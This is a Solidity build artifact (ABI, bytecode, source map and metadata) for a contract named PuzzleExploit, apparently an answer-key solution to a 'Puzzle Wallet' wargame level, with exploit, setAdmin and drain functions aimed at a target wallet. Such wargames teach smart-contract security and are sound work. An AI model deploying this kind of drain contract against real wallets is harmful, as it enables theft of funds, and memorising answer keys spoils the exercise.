{"abi":[{"type":"constructor","inputs":[{"name":"_target","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"drain","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploit","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"setAdmin","inputs":[{"name":"newAdmin","type":"address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IPuzzleWallet"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610311380380610311833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b61028b806100865f395ff3fe608060405260043610610041575f3560e01c806363d9b7701461004c578063704b6c02146100565780639890220b14610075578063d4b8399214610089575f5ffd5b3661004857005b5f5ffd5b6100546100c3565b005b348015610061575f5ffd5b50610054610070366004610228565b61013f565b348015610080575f5ffd5b5061005461019b565b348015610094575f5ffd5b505f546100a7906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b5f8054604080517fd0e30db000000000000000000000000000000000000000000000000000000000815290516001600160a01b039092169263d0e30db09266038d7ea4c6800092600480820193929182900301818588803b158015610126575f5ffd5b505af1158015610138573d5f5f3e3d5ffd5b5050505050565b5f546040517f9d51d9b70000000000000000000000000000000000000000000000000000000081526001600160a01b03838116600483015290911690639d51d9b7906024015f604051808303815f87803b158015610126575f5ffd5b5f80546040517fb61d27f600000000000000000000000000000000000000000000000000000000815233600482015266038d7ea4c6800060248201526060604482015260648101929092526001600160a01b03169063b61d27f6906084015f604051808303815f87803b158015610210575f5ffd5b505af1158015610222573d5f5f3e3d5ffd5b50505050565b5f60208284031215610238575f5ffd5b81356001600160a01b038116811461024e575f5ffd5b939250505056fea2646970667358221220fb8609cabe1a38330a7d6df31a9b2507f90b2e4bd61c3cedcce152d10c33656c64736f6c634300081c0033","sourceMap":"336:656:0:-:0;;;403:77;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;442:6;:31;;-1:-1:-1;;;;;;442:31:0;-1:-1:-1;;;;;442:31:0;;;;;;;;;;336:656;;14:290:1;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:1;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:1:o;:::-;336:656:0;;;;;;","linkReferences":{}},"deployedBytecode":{"object":"0x608060405260043610610041575f3560e01c806363d9b7701461004c578063704b6c02146100565780639890220b14610075578063d4b8399214610089575f5ffd5b3661004857005b5f5ffd5b6100546100c3565b005b348015610061575f5ffd5b50610054610070366004610228565b61013f565b348015610080575f5ffd5b5061005461019b565b348015610094575f5ffd5b505f546100a7906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b5f8054604080517fd0e30db000000000000000000000000000000000000000000000000000000000815290516001600160a01b039092169263d0e30db09266038d7ea4c6800092600480820193929182900301818588803b158015610126575f5ffd5b505af1158015610138573d5f5f3e3d5ffd5b5050505050565b5f546040517f9d51d9b70000000000000000000000000000000000000000000000000000000081526001600160a01b03838116600483015290911690639d51d9b7906024015f604051808303815f87803b158015610126575f5ffd5b5f80546040517fb61d27f600000000000000000000000000000000000000000000000000000000815233600482015266038d7ea4c6800060248201526060604482015260648101929092526001600160a01b03169063b61d27f6906084015f604051808303815f87803b158015610210575f5ffd5b505af1158015610222573d5f5f3e3d5ffd5b50505050565b5f60208284031215610238575f5ffd5b81356001600160a01b038116811461024e575f5ffd5b939250505056fea2646970667358221220fb8609cabe1a38330a7d6df31a9b2507f90b2e4bd61c3cedcce152d10c33656c64736f6c634300081c0033","sourceMap":"336:656:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;490:153;;;:::i;:::-;;790:161;;;;;;;;;;-1:-1:-1;790:161:0;;;;;:::i;:::-;;:::i;653:127::-;;;;;;;;;;;;;:::i;365:27::-;;;;;;;;;;-1:-1:-1;365:27:0;;;;-1:-1:-1;;;;;365:27:0;;;;;;-1:-1:-1;;;;;512:55:1;;;494:74;;482:2;467:18;365:27:0;;;;;;;490:153;600:6;;;:36;;;;;;;;-1:-1:-1;;;;;600:6:0;;;;:14;;622:11;;600:36;;;;;:6;:36;;;;;;622:11;600:6;:36;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;490:153::o;790:161::-;896:6;;:48;;;;;-1:-1:-1;;;;;917:26:0;;;896:48;;;725:25:1;896:6:0;;;;:20;;698:18:1;;896:48:0;;;;;;;;;;;;;;;;;;;653:127;730:6;;;:43;;;;;745:10;730:43;;;1023:74:1;757:11:0;1113:18:1;;;1106:34;1176:2;1156:18;;;1149:30;1195:18;;;1188:29;;;;-1:-1:-1;;;;;730:6:0;;:14;;1234:19:1;;730:43:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;653:127::o;14:309:1:-;73:6;126:2;114:9;105:7;101:23;97:32;94:52;;;142:1;139;132:12;94:52;181:9;168:23;-1:-1:-1;;;;;224:5:1;220:54;213:5;210:65;200:93;;289:1;286;279:12;200:93;312:5;14:309;-1:-1:-1;;;14:309:1:o","linkReferences":{}},"methodIdentifiers":{"drain()":"9890220b","exploit()":"63d9b770","setAdmin(address)":"704b6c02","target()":"d4b83992"},"rawMetadata":"{\"compiler\":{\"version\":\"0.8.28+commit.7893614a\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_target\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"drain\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exploit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAdmin\",\"type\":\"address\"}],\"name\":\"setAdmin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"target\",\"outputs\":[{\"internalType\":\"contract IPuzzleWallet\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"src/answers/PuzzleExploit.sol\":\"PuzzleExploit\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":true,\"runs\":1000},\"remappings\":[\":ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/\",\":erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/\",\":forge-std/=lib/forge-std/src/\",\":openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/\",\":openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/\",\":openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/\",\":openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/\",\":openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/\"]},\"sources\":{\"src/answers/PuzzleExploit.sol\":{\"keccak256\":\"0xa80c741917f3e1241ec0794799fe32d287293415fe41c58b34b04d5e4f16c2b9\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://ac6f3cbd76a2abf289acced71de76acd4841553329caa780667fa3931cdde0a0\",\"dweb:/ipfs/QmUdrJEfL8nzSk8J1Gz8uQ9BKKtgzUn8UjaomtKAPx5whM\"]}},\"version\":1}","metadata":{"compiler":{"version":"0.8.28+commit.7893614a"},"language":"Solidity","output":{"abi":[{"inputs":[{"internalType":"address","name":"_target","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"stateMutability":"nonpayable","type":"function","name":"drain"},{"inputs":[],"stateMutability":"payable","type":"function","name":"exploit"},{"inputs":[{"internalType":"address","name":"newAdmin","type":"address"}],"stateMutability":"nonpayable","type":"function","name":"setAdmin"},{"inputs":[],"stateMutability":"view","type":"function","name":"target","outputs":[{"internalType":"contract IPuzzleWallet","name":"","type":"address"}]},{"inputs":[],"stateMutability":"payable","type":"receive"}],"devdoc":{"kind":"dev","methods":{},"version":1},"userdoc":{"kind":"user","methods":{},"version":1}},"settings":{"remappings":["ds-test/=lib/openzeppelin-contracts-upgradeable/lib/forge-std/lib/ds-test/src/","erc4626-tests/=lib/openzeppelin-contracts-upgradeable/lib/erc4626-tests/","forge-std/=lib/forge-std/src/","openzeppelin-contracts-06/=lib/openzeppelin-contracts-06/contracts/","openzeppelin-contracts-08/=lib/openzeppelin-contracts-08/contracts/","openzeppelin-contracts-upgradeable/=lib/openzeppelin-contracts-upgradeable/","openzeppelin-upgradeable/=lib/openzeppelin-contracts-upgradeable/contracts/","openzeppelin/=lib/openzeppelin-contracts-upgradeable/contracts/"],"optimizer":{"enabled":true,"runs":1000},"metadata":{"bytecodeHash":"ipfs"},"compilationTarget":{"src/answers/PuzzleExploit.sol":"PuzzleExploit"},"evmVersion":"shanghai","libraries":{}},"sources":{"src/answers/PuzzleExploit.sol":{"keccak256":"0xa80c741917f3e1241ec0794799fe32d287293415fe41c58b34b04d5e4f16c2b9","urls":["bzz-raw://ac6f3cbd76a2abf289acced71de76acd4841553329caa780667fa3931cdde0a0","dweb:/ipfs/QmUdrJEfL8nzSk8J1Gz8uQ9BKKtgzUn8UjaomtKAPx5whM"],"license":"MIT"}},"version":1},"id":0}